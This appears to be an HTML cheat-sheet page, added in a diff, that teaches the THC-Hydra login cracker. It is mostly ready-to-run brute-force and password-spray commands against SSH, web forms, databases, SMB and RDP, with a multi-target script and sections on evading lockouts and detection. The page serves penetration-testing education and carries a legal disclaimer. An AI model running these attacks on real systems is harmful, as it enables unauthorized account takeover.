@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hydra Guide - Cybersecurity Cheat Sheet</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="../guide-styles.css">
+</head>
+<body>
+    <div class="guide-container">
+        <header class="guide-header">
+            <h1>Hydra: Network Login Cracker</h1>
+            <p>Master Network Service Password Attacks and Authentication Testing</p>
+            <a href="../index.html" class="back-link">&larr; Back to Cheat Sheet</a>
+        </header>
+
+        <main class="guide-content">
+            <section id="introduction">
+                <h2>What is Hydra?</h2>
+                <p>THC-Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely. Hydra supports over 50 protocols including SSH, FTP, HTTP, HTTPS, SMB, Telnet, and many more. It's widely used in penetration testing and security assessments to test the strength of authentication mechanisms.</p>
+            </section>
+
+            <section id="installation">
+                <h2>Installation & Setup</h2>
+                <div class="command-block">
+                    <h3>Linux Installation</h3>
+                    <pre><code># Ubuntu/Debian
+sudo apt update
+sudo apt install hydra
+
+# CentOS/RHEL/Fedora
+sudo yum install hydra
+# or
+sudo dnf install hydra
+
+# From source
+git clone https://github.com/vanhauser-thc/thc-hydra.git
+cd thc-hydra
+./configure
+make
+sudo make install
+
+# Verify installation
+hydra -h</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>macOS Installation</h3>
+                    <pre><code># Using Homebrew
+brew install hydra
+
+# From source
+git clone https://github.com/vanhauser-thc/thc-hydra.git
+cd thc-hydra
+./configure
+make
+sudo make install
+
+# Verify installation
+hydra -h</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Windows Installation</h3>
+                    <pre><code># Using WSL (recommended)
+wsl --install
+# Then follow Linux installation steps
+
+# Native Windows (complex, requires compilation)
+# Download from: https://github.com/vanhauser-thc/thc-hydra
+
+# Using Docker
+docker pull vanhauser/hydra
+docker run --rm vanhauser/hydra -h</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Docker Installation</h3>
+                    <pre><code># Pull Hydra Docker image
+docker pull vanhauser/hydra
+
+# Run SSH brute force
+docker run --rm vanhauser/hydra -l admin -P passwords.txt ssh://192.168.1.100
+
+# Run with custom wordlists
+docker run --rm -v $(pwd):/wordlists vanhauser/hydra -L /wordlists/users.txt -P /wordlists/passwords.txt ssh://target</code></pre>
+                </div>
+            </section>
+
+            <section id="basic-usage">
+                <h2>Basic Usage</h2>
+                <div class="command-block">
+                    <h3>Command Structure</h3>
+                    <pre><code># Basic syntax
+hydra [options] target service
+
+# Single username and password
+hydra -l username -p password target service
+
+# Username list and password list
+hydra -L userlist.txt -P passwordlist.txt target service
+
+# Mixed options
+hydra -l admin -P passwords.txt -t 4 -V target ssh</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Common Services</h3>
+                    <pre><code># SSH brute force
+hydra -l root -P passwords.txt ssh://192.168.1.100
+
+# FTP brute force
+hydra -L users.txt -P passwords.txt ftp://192.168.1.100
+
+# HTTP Basic Auth
+hydra -l admin -P passwords.txt http-get://192.168.1.100/admin
+
+# HTTP POST form
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+
+# Telnet brute force
+hydra -L users.txt -P passwords.txt telnet://192.168.1.100</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Performance Options</h3>
+                    <pre><code># Number of parallel tasks
+hydra -l admin -P passwords.txt -t 16 ssh://target
+
+# Connection timeout
+hydra -l admin -P passwords.txt -w 30 ssh://target
+
+# Wait time between connections
+hydra -l admin -P passwords.txt -W 1 ssh://target
+
+# Maximum attempts per task
+hydra -l admin -P passwords.txt -c 3 ssh://target</code></pre>
+                </div>
+            </section>
+
+            <section id="protocol-specific">
+                <h2>Protocol-Specific Attacks</h2>
+                <div class="command-block">
+                    <h3>SSH Attacks</h3>
+                    <pre><code># Basic SSH brute force
+hydra -l root -P rockyou.txt ssh://192.168.1.100
+
+# SSH with custom port
+hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100
+
+# SSH with multiple users
+hydra -L users.txt -P passwords.txt ssh://192.168.1.100
+
+# SSH with verbose output
+hydra -l root -P passwords.txt -V ssh://192.168.1.100</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>HTTP Attacks</h3>
+                    <pre><code># HTTP Basic Authentication
+hydra -l admin -P passwords.txt http-get://192.168.1.100/admin/
+
+# HTTP POST form attack
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"
+
+# HTTPS form attack
+hydra -l admin -P passwords.txt 192.168.1.100 https-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+# HTTP with custom headers
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/api/login:username=^USER^&password=^PASS^:error:H=Content-Type: application/json"</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Database Attacks</h3>
+                    <pre><code># MySQL brute force
+hydra -l root -P passwords.txt mysql://192.168.1.100
+
+# PostgreSQL attack
+hydra -l postgres -P passwords.txt postgres://192.168.1.100
+
+# MSSQL attack
+hydra -l sa -P passwords.txt mssql://192.168.1.100
+
+# MongoDB attack
+hydra -l admin -P passwords.txt mongodb://192.168.1.100</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>SMB/Windows Attacks</h3>
+                    <pre><code># SMB brute force
+hydra -l administrator -P passwords.txt smb://192.168.1.100
+
+# RDP brute force
+hydra -l administrator -P passwords.txt rdp://192.168.1.100
+
+# WinRM attack
+hydra -l admin -P passwords.txt winrm://192.168.1.100</code></pre>
+                </div>
+            </section>
+
+            <section id="wordlists">
+                <h2>Wordlists and Dictionaries</h2>
+                <div class="command-block">
+                    <h3>Common Wordlists</h3>
+                    <pre><code># Default wordlist locations
+/usr/share/wordlists/rockyou.txt
+/usr/share/wordlists/fasttrack.txt
+/usr/share/wordlists/dirb/others/best110.txt
+
+# SecLists wordlists
+git clone https://github.com/danielmiessler/SecLists.git
+# Passwords: SecLists/Passwords/
+# Usernames: SecLists/Usernames/
+
+# Common default credentials
+/usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
+/usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Custom Wordlist Creation</h3>
+                    <pre><code># Create username list
+echo -e "admin\nadministrator\nroot\nuser\ntest" > users.txt
+
+# Create password list
+echo -e "password\n123456\nadmin\nroot\ntest" > passwords.txt
+
+# Generate password variations
+john --wordlist=base.txt --rules --stdout > variations.txt
+
+# Combine multiple wordlists
+cat wordlist1.txt wordlist2.txt | sort -u > combined.txt
+
+# Filter by length
+awk 'length($0) >= 6 && length($0) <= 12' passwords.txt > filtered.txt</code></pre>
+                </div>
+            </section>
+
+            <section id="advanced-techniques">
+                <h2>Advanced Techniques</h2>
+                <div class="command-block">
+                    <h3>Restore Sessions</h3>
+                    <pre><code># Save session
+hydra -l admin -P passwords.txt -o results.txt -R hydra.restore ssh://target
+
+# Resume session
+hydra -R hydra.restore
+
+# Continue from specific point
+hydra -l admin -P passwords.txt -x 100:200 ssh://target</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Custom Modules</h3>
+                    <pre><code># List available modules
+hydra -U service_name
+
+# Get module help
+hydra -U http-post-form
+
+# Custom HTTP form parameters
+hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^&submit=Login:Invalid:H=Cookie: PHPSESSID=abc123"</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Proxy and Network Options</h3>
+                    <pre><code># Use SOCKS proxy
+hydra -l admin -P passwords.txt -e nsr -S -s 1080 ssh://target
+
+# Use HTTP proxy
+hydra -l admin -P passwords.txt -e nsr -S -s 8080 http-get://target
+
+# IPv6 support
+hydra -l admin -P passwords.txt -6 ssh://[2001:db8::1]
+
+# Custom source port
+hydra -l admin -P passwords.txt -g 12345 ssh://target</code></pre>
+                </div>
+            </section>
+
+            <section id="evasion-techniques">
+                <h2>Evasion and Stealth</h2>
+                <div class="command-block">
+                    <h3>Rate Limiting</h3>
+                    <pre><code># Slow and stealthy
+hydra -l admin -P passwords.txt -t 1 -W 5 ssh://target
+
+# Random delays
+hydra -l admin -P passwords.txt -W 1-10 ssh://target
+
+# Limited attempts
+hydra -l admin -P passwords.txt -f ssh://target</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>User Agent and Headers</h3>
+                    <pre><code># Custom User-Agent
+hydra -l admin -P passwords.txt http-get://target -H "User-Agent: Mozilla/5.0"
+
+# Multiple headers
+hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:error:H=User-Agent: Custom:H=X-Forwarded-For: 127.0.0.1"
+
+# Randomize source
+# Use different source IPs if available</code></pre>
+                </div>
+            </section>
+
+            <section id="automation">
+                <h2>Automation and Scripting</h2>
+                <div class="command-block">
+                    <h3>Batch Processing</h3>
+                    <pre><code># Multi-target script
+#!/bin/bash
+targets=("192.168.1.100" "192.168.1.101" "192.168.1.102")
+userlist="users.txt"
+passlist="passwords.txt"
+
+for target in "${targets[@]}"; do
+    echo "Attacking $target"
+    hydra -L "$userlist" -P "$passlist" -o "hydra_$target.txt" ssh://"$target"
+    sleep 10
+done</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Result Processing</h3>
+                    <pre><code># Extract successful logins
+grep "login:" hydra_results.txt | awk '{print $5, $7}' > successful_logins.txt
+
+# Parse results with Python
+import re
+
+with open('hydra_results.txt', 'r') as f:
+    content = f.read()
+    
+matches = re.findall(r'\[(\d+)\]\[(\w+)\] host: ([\d.]+)   login: (\w+)   password: (\w+)', content)
+for match in matches:
+    port, service, host, user, password = match
+    print(f"Success: {host}:{port} {service} {user}:{password}")</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Integration with Other Tools</h3>
+                    <pre><code># Combine with Nmap
+nmap -p 22 --open 192.168.1.0/24 | grep -E "^[0-9]" | awk '{print $1}' > ssh_hosts.txt
+while read host; do
+    hydra -l root -P passwords.txt ssh://"$host"
+done < ssh_hosts.txt
+
+# Integration with Metasploit
+# Use Hydra results to configure MSF modules
+# msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS file:ssh_hosts.txt; set USER_FILE users.txt; set PASS_FILE passwords.txt; run"</code></pre>
+                </div>
+            </section>
+
+            <section id="defense-evasion">
+                <h2>Defense Evasion</h2>
+                <div class="command-block">
+                    <h3>Account Lockout Avoidance</h3>
+                    <pre><code># Limited attempts per user
+hydra -L users.txt -p password123 -t 1 -W 60 ssh://target
+
+# Spray attack (few passwords, many users)
+hydra -L large_userlist.txt -p Password123 ssh://target
+
+# Time-based attacks
+# Attack during off-hours or maintenance windows</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Log Evasion</h3>
+                    <pre><code># Distributed attacks
+# Use multiple source IPs
+# Coordinate timing across sources
+
+# Low and slow approach
+hydra -l admin -P passwords.txt -t 1 -W 300 ssh://target
+
+# Mixed with legitimate traffic
+# Blend attacks with normal business hours</code></pre>
+                </div>
+            </section>
+
+            <section id="troubleshooting">
+                <h2>Troubleshooting</h2>
+                <div class="command-block">
+                    <h3>Common Issues</h3>
+                    <pre><code># Debug mode
+hydra -l admin -P passwords.txt -d ssh://target
+
+# Verbose output
+hydra -l admin -P passwords.txt -V ssh://target
+
+# Check connectivity
+nc -zv target 22
+
+# Test single login
+hydra -l admin -p password123 -V ssh://target</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Performance Issues</h3>
+                    <pre><code># Reduce threads
+hydra -l admin -P passwords.txt -t 4 ssh://target
+
+# Increase timeout
+hydra -l admin -P passwords.txt -w 60 ssh://target
+
+# Monitor system resources
+top -p $(pgrep hydra)
+
+# Check network latency
+ping target</code></pre>
+                </div>
+            </section>
+
+            <section id="use-cases">
+                <h2>Common Use Cases</h2>
+                <div class="command-block">
+                    <h3>Penetration Testing</h3>
+                    <ul>
+                        <li>Authentication strength assessment</li>
+                        <li>Default credential testing</li>
+                        <li>Password policy validation</li>
+                        <li>Account lockout mechanism testing</li>
+                        <li>Multi-service credential reuse detection</li>
+                    </ul>
+                </div>
+                <div class="command-block">
+                    <h3>Security Auditing</h3>
+                    <ul>
+                        <li>Compliance testing for password policies</li>
+                        <li>Weak credential identification</li>
+                        <li>Service hardening validation</li>
+                        <li>Access control effectiveness testing</li>
+                        <li>Security awareness training demonstrations</li>
+                    </ul>
+                </div>
+            </section>
+
+            <section id="tips">
+                <h2>Pro Tips & Best Practices</h2>
+                <ul>
+                    <li><strong>Start with common credentials:</strong> Test default and common passwords first</li>
+                    <li><strong>Respect account lockouts:</strong> Avoid triggering security mechanisms</li>
+                    <li><strong>Use appropriate timing:</strong> Consider business hours and maintenance windows</li>
+                    <li><strong>Monitor target response:</strong> Watch for defensive measures or blocking</li>
+                    <li><strong>Document findings:</strong> Keep detailed records of successful authentications</li>
+                    <li><strong>Test multiple services:</strong> Check for credential reuse across services</li>
+                    <li><strong>Use targeted wordlists:</strong> Customize wordlists based on target organization</li>
+                    <li><strong>Combine with OSINT:</strong> Use gathered intelligence to improve wordlists</li>
+                    <li><strong>Validate results:</strong> Confirm successful logins manually</li>
+                    <li><strong>Follow responsible disclosure:</strong> Report findings appropriately</li>
+                </ul>
+            </section>
+
+            <section id="legal-disclaimer">
+                <h2>Legal Disclaimer</h2>
+                <div class="command-block">
+                    <p><strong>WARNING:</strong> Hydra should only be used for:</p>
+                    <ul>
+                        <li>Testing systems you own or have explicit permission to test</li>
+                        <li>Authorized penetration testing with proper legal agreements</li>
+                        <li>Security assessments with documented scope and approval</li>
+                        <li>Educational purposes in controlled lab environments</li>
+                        <li>Compliance testing with appropriate authorization</li>
+                    </ul>
+                    <p>Unauthorized password attacks may violate computer crime laws, terms of service, and other regulations. Network authentication testing should only be performed by qualified professionals with proper authorization and legal agreements. Hydra can trigger security controls, cause account lockouts, and generate significant logs that may alert security teams. Always ensure you have explicit written permission before testing any network service authentication. Password brute-force attacks can be considered intrusive and may cause service disruption or trigger incident response procedures. Maintain proper documentation of testing activities and findings. Follow responsible disclosure practices for any weak credentials discovered. Be aware that authentication attacks may be logged and monitored by target systems. Respect rate limits and implement appropriate delays to minimize impact on target systems. Some jurisdictions have specific laws regarding password cracking tools and their use.</p>
+                </div>
+            </section>
+        </main>
+    </div>
+</body>
+</html>
